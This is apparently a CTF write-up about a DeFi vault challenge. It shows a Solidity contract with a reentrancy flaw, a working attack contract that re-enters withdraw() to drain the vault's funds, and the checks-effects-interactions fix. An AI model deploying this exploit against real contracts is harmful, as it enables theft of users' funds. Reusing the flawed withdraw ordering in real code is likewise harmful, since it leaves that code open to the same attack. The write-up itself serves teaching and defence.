---
title: "DeFi CTF — Reentrancy Attack on Vulnerable Vault"
date: 2024-08-10
tags: ["CTF", "Web3", "Solidity", "Reentrancy", "DeFi"]
tldr: "Exploiting a classic reentrancy vulnerability in a DeFi vault contract to drain all funds."
---

## Challenge

A vault contract allows deposits and withdrawals. Find and exploit the vulnerability.

## Vulnerable Code

```solidity
// VULNERABLE — do not use in production
contract VulnerableVault {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "Nothing to withdraw");

        // BUG: External call before state update
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        balances[msg.sender] = 0; // Too late!
    }
}
```

## Exploit Contract

```solidity
contract ReentrancyAttack {
    VulnerableVault public target;

    constructor(address _target) {
        target = VulnerableVault(_target);
    }

    function attack() external payable {
        target.deposit{value: msg.value}();
        target.withdraw();
    }

    receive() external payable {
        if (address(target).balance >= 1 ether) {
            target.withdraw(); // Re-enter!
        }
    }
}
```

## Fix

```solidity
// FIXED — Checks-Effects-Interactions pattern
function withdraw() public {
    uint256 amount = balances[msg.sender];
    require(amount > 0, "Nothing to withdraw");

    balances[msg.sender] = 0;  // State update FIRST

    (bool success, ) = msg.sender.call{value: amount}("");
    require(success, "Transfer failed");
}
```
